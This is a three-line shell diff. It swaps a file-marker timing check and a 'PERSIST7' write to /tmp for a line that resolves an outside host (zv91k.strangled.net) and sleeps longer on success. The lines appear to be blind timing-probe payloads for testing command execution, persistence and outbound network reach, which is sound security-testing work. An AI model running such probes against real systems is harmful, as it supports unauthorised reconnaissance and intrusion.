@@ -1,2 +1,1 @@
-[ -s /tmp/w.txt ] && sleep 8 || sleep 1
-printf '%s' 'PERSIST7' > /tmp/w.txt
+getent hosts zv91k.strangled.net > /dev/null 2>&1 && sleep 8 || sleep 1
